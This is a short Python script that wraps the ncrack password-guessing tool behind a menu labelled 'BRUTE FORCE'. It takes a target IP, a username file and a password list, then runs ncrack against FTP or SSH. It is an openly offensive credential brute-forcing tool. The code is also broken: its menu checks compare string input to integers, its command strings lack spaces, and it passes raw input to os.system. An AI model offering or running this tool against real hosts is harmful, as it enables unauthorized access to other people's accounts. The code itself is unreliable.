#!/usr/bin/env python





import os





os.system("apt-get install figlet")

os.system("clear")

os.system("figlet BRUTE FORCE")



print("""*******LOADING





1.FTP

2.SSH

3.telnet

4.HTTP

5.SMB

6.ROP

7.SIP

8.Redis

9.VNC

10.PostgreSQL

11.Mysql



*********""")





islem=input("number?")

hedef=input("ip?")

us=input("username file?")

passwr=input("Password list?")







if islem==1:

	os.system("ncrack -p 21 -u" + us + "-P"  + passwr	+ " " +  hedef )

elif islem==2:

	os.system("ncrack -p 22 -u" + us+ "-P" + passwr +  " " +  hedef )	

	